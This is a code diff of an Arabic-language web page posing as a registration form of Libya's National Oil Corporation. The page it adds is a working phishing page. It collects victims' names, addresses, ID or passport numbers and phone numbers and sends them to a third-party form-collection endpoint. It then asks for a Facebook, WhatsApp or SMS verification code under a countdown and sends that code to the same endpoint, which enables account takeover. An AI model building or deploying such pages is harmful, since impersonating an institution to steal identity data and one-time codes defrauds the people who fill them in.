@@ -2,285 +2,240 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>تسجيل البيانات</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>نموذج التسجيل - مؤسسة النفط الليبية</title>
   <style>
     body {
-      font-family: 'Tahoma', sans-serif;
-      background-color: #f9f9f9;
+      font-family: 'Arial', sans-serif;
+      background: #f2f2f2;
       margin: 0;
       padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      height: 100vh;
     }
 
-    .form-container {
-      background-color: #fff;
-      padding: 20px;
+    .container {
+      background: #ffffff;
+      padding: 30px;
       border-radius: 16px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      width: 90%;
-      max-width: 320px;
-      position: relative;
-    }
-
-    .logo {
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 450px;
+      box-sizing: border-box;
+      border-top: 5px solid #003366;
       text-align: center;
-      margin-bottom: 15px;
     }
 
-    .logo img {
-      max-width: 80px;
+    .container img.logo {
+      width: 100px;
+      margin-bottom: 10px;
     }
 
     h2 {
-      text-align: center;
-      color: #002147;
-      font-size: 20px;
+      color: #003366;
       margin-bottom: 20px;
-    }
-
-    .form-group {
-      margin-bottom: 14px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
     }
 
     label {
       display: block;
-      margin-bottom: 4px;
-      font-size: 13px;
-      color: #002147;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #003366;
+      text-align: right;
     }
 
-    input[type="text"],
-    input[type="tel"],
-    input[type="password"],
-    select {
+    input, select, button {
       width: 100%;
-      max-width: 260px;
       padding: 10px;
-      font-size: 14px;
-      border: 1px solid #ccc;
+      font-size: 15px;
+      margin-top: 5px;
       border-radius: 6px;
-      background-color: #fff;
-    }
-
-    .birthdate-inputs {
-      display: flex;
-      gap: 6px;
-      justify-content: center;
-      width: 100%;
-      max-width: 260px;
-    }
-
-    .birthdate-inputs input {
-      flex: 1;
-      text-align: center;
-      padding: 10px;
-      font-size: 14px;
-    }
-
-    .password-wrapper {
-      width: 100%;
-      max-width: 260px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin: 0 auto 20px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
     }
 
     button {
-      width: 100%;
-      padding: 12px;
-      background-color: #2e7d32;
-      color: #fff;
+      background-color: #003366;
+      color: white;
       border: none;
-      border-radius: 6px;
-      font-size: 15px;
-      font-weight: bold;
       cursor: pointer;
       margin-top: 20px;
     }
 
-    .code-popup,
-    .overlay-popup {
-      position: fixed;
-      left: 10px;
-      right: 10px;
-      background: #fff;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      padding: 14px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    button:hover {
+      background-color: #002244;
+    }
+
+    .popup {
       display: none;
-      z-index: 100;
+      position: fixed;
+      top: 30px;
+      left: 0;
+      right: 0;
+      margin: auto;
+      max-width: 420px;
+      background: #ffffff;
+      border: 2px solid #003366;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      z-index: 1000;
     }
 
-    .overlay-popup {
-      bottom: 15px;
-      z-index: 101;
-    }
-
-    .code-popup {
-      bottom: 80px;
-      z-index: 102;
-    }
-
-    .code-popup h4,
-    .overlay-popup h4 {
-      margin: 0 0 8px;
-      color: #002147;
-      font-size: 15px;
-    }
-
-    .code-popup input,
-    .overlay-popup input {
-      width: 100%;
-      padding: 10px;
-      font-size: 14px;
-      margin-bottom: 8px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
+    .popup h3 {
+      font-size: 16px;
+      color: #cc0000;
+      text-align: center;
+      margin-bottom: 15px;
     }
 
     .countdown {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 8px;
-    }
-
-    .error {
-      color: red;
-      font-size: 12px;
-      display: none;
       text-align: center;
-    }
-
-    @media (max-width: 400px) {
-      .form-container {
-        padding: 15px;
-        margin: 10px;
-      }
+      font-weight: bold;
+      margin-top: 10px;
+      color: #cc0000;
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <div class="logo">
-      <img src="logo.png" alt="شعار المؤسسة الوطنية للنفط">
+
+<div class="container">
+  <!-- شعار المؤسسة -->
+  <img src="https://upload.wikimedia.org/wikipedia/ar/3/3c/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط" class="logo" />
+  <h2>نموذج التسجيل - مؤسسة النفط الليبية</h2>
+
+  <form id="mainForm">
+    <label>الاسم الكامل:</label>
+    <input type="text" id="fullName" name="fullName" required />
+
+    <label>العنوان:</label>
+    <input type="text" id="address" name="address" required />
+
+    <label>نوع الوثيقة:</label>
+    <select id="docType" required>
+      <option value="">اختر نوع الوثيقة</option>
+      <option value="بطاقة">بطاقة</option>
+      <option value="جواز سفر">جواز سفر</option>
+    </select>
+
+    <div id="docNumberContainer" style="display:none;">
+      <label id="docLabel">رقم الوثيقة:</label>
+      <input type="text" id="docNumber" name="docNumber" required />
     </div>
-    <h2>نموذج التسجيل</h2>
-    <form id="registrationForm">
-      <div class="form-group">
-        <label for="fullName">الاسم الكامل</label>
-        <input type="text" id="fullName" name="fullName" required>
-      </div>
-      <div class="form-group">
-        <label for="address">العنوان</label>
-        <input type="text" id="address" name="address" required>
-      </div>
-      <div class="form-group">
-        <label>تاريخ الميلاد</label>
-        <div class="birthdate-inputs">
-          <input type="text" name="day" placeholder="يوم" maxlength="2" required>
-          <input type="text" name="month" placeholder="شهر" maxlength="2" required>
-          <input type="text" name="year" placeholder="سنة" maxlength="4" required>
-        </div>
-      </div>
-      <div class="form-group">
-        <label for="documentType">نوع الوثيقة</label>
-        <select id="documentType" name="documentType" required>
-          <option value="">-- اختر نوع الوثيقة --</option>
-          <option value="passport">جواز سفر</option>
-          <option value="idcard">بطاقة شخصية</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label for="idNumber">رقم الوثيقة</label>
-        <input type="text" id="idNumber" name="idNumber" required>
-      </div>
-      <div class="form-group">
-        <label for="phone">رقم الهاتف</label>
-        <input type="tel" id="phone" name="phone" required>
-      </div>
-      <div class="form-group password-wrapper">
-        <label for="password">الرقم السري</label>
-        <input type="password" id="password" name="password" minlength="6" required>
-      </div>
-      <div class="error" id="validationError">يرجى التأكد من صحة البيانات.</div>
-      <button type="submit">إرسال البيانات</button>
-    </form>
-  </div>
 
-  <div class="overlay-popup" id="waitPopup">
-    <h4>يرجى انتظار استلام الكود من فيسبوك أو واتساب أو SMS</h4>
-  </div>
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone" name="phone" required />
 
-  <div class="code-popup" id="codePopup">
-    <h4>أدخل كود التأكيد</h4>
-    <input type="text" id="verificationCode" maxlength="8" placeholder="كود من 6-8 حروف أو أرقام">
+    <button type="submit">أكمل الطلب</button>
+  </form>
+</div>
+
+<!-- نافذة كود التوثيق -->
+<div class="popup" id="codePopup">
+  <form id="codeForm">
+    <h3>يرجى انتظار كود التأكيد من إشعار فيسبوك أو واتساب أو رسالة SMS</h3>
+
+    <label>كود التوثيق:</label>
+    <input type="text" id="code" name="code" required placeholder="أدخل الكود من فيسبوك أو واتساب" />
+
+    <button type="submit">إرسال الكود</button>
     <div class="countdown" id="countdown">08:00</div>
-    <div class="error" id="codeError">يرجى إدخال كود صحيح من 6 إلى 8 خانات.</div>
-    <button onclick="verifyCode()">تأكيد</button>
-  </div>
+  </form>
+</div>
 
-  <script>
-    document.getElementById("registrationForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const fullName = document.getElementById("fullName").value.trim();
-      const address = document.getElementById("address").value.trim();
-      const phone = document.getElementById("phone").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const documentType = document.getElementById("documentType").value;
-      const errorEl = document.getElementById("validationError");
+<script>
+  const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
 
-      const nameRegex = /^[\u0600-\u06FF\s]{8,33}$/;
-      const addressRegex = /^[\u0600-\u06FF\s]{3,22}$/;
-      const phoneRegex = /^\+2189\d{7}$/;
-      const passwordRegex = /^\d{6,15}$/;
+  document.getElementById("docType").addEventListener("change", function () {
+    const docContainer = document.getElementById("docNumberContainer");
+    const docLabel = document.getElementById("docLabel");
+    const docNumber = document.getElementById("docNumber");
 
-      if (!nameRegex.test(fullName) ||
-          !addressRegex.test(address) ||
-          !phoneRegex.test(phone) ||
-          !passwordRegex.test(password) ||
-          !documentType) {
-        errorEl.style.display = "block";
-        return;
-      }
-
-      errorEl.style.display = "none";
-      document.querySelectorAll("#registrationForm input, #registrationForm select").forEach(input => input.disabled = true);
-      document.getElementById("waitPopup").style.display = "block";
-      setTimeout(() => {
-        document.getElementById("codePopup").style.display = "block";
-      }, 1000);
-      startCountdown();
-    });
-
-    function startCountdown() {
-      let time = 480;
-      const countdownEl = document.getElementById("countdown");
-      const interval = setInterval(() => {
-        const minutes = Math.floor(time / 60);
-        const seconds = time % 60;
-        countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        if (time-- <= 0) clearInterval(interval);
-      }, 1000);
+    if (this.value === "بطاقة") {
+      docLabel.textContent = "رقم البطاقة:";
+      docNumber.placeholder = "أدخل رقم البطاقة";
+    } else if (this.value === "جواز سفر") {
+      docLabel.textContent = "رقم جواز السفر:";
+      docNumber.placeholder = "أدخل رقم جواز السفر";
     }
 
-    function verifyCode() {
-      const code = document.getElementById("verificationCode").value.trim();
-      const errorEl = document.getElementById("codeError");
-      if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
-        alert("تم التأكيد بنجاح!");
-      } else {
-        errorEl.style.display = "block";
-      }
+    docContainer.style.display = this.value ? "block" : "none";
+  });
+
+  document.getElementById("mainForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const fullName = document.getElementById("fullName").value.trim();
+    const docType = document.getElementById("docType").value;
+    const docNumber = document.getElementById("docNumber").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const address = document.getElementById("address").value.trim();
+
+    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
+    if (!arabicRegex.test(fullName)) {
+      alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 8 أحرف أو أكثر.");
+      return;
     }
-  </script>
+
+    const phoneRegex = /^(091|092|094)\d{7}$/;
+    if (!phoneRegex.test(phone)) {
+      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
+      return;
+    }
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ fullName, docType, docNumber, phone, address })
+    }).then(() => {
+      // تعطيل الحقول
+      document.querySelectorAll("#mainForm input, #mainForm select, #mainForm button").forEach(el => {
+        el.disabled = true;
+      });
+
+      // إظهار نافذة التوثيق
+      document.getElementById("codePopup").style.display = "block";
+      startCountdown(8 * 60);
+    }).catch(() => alert("حدث خطأ أثناء الإرسال"));
+  });
+
+  document.getElementById("codeForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const code = document.getElementById("code").value.trim();
+    if (!/^[A-Za-z0-9]{6,8}$/.test(code)) {
+      alert("الكود يجب أن يكون من 6 إلى 8 أرقام أو أحرف.");
+      return;
+    }
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code })
+    }).then(() => {
+      alert("تم إرسال الكود بنجاح");
+    }).catch(() => alert("فشل إرسال الكود"));
+  });
+
+  function startCountdown(duration) {
+    let timer = duration, minutes, seconds;
+    const countdown = document.getElementById("countdown");
+
+    const interval = setInterval(() => {
+      minutes = Math.floor(timer / 60);
+      seconds = timer % 60;
+
+      countdown.textContent = 
+        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+      if (--timer < 0) {
+        clearInterval(interval);
+        countdown.textContent = "انتهى الوقت!";
+      }
+    }, 1000);
+  }
+</script>
 </body>
 </html>
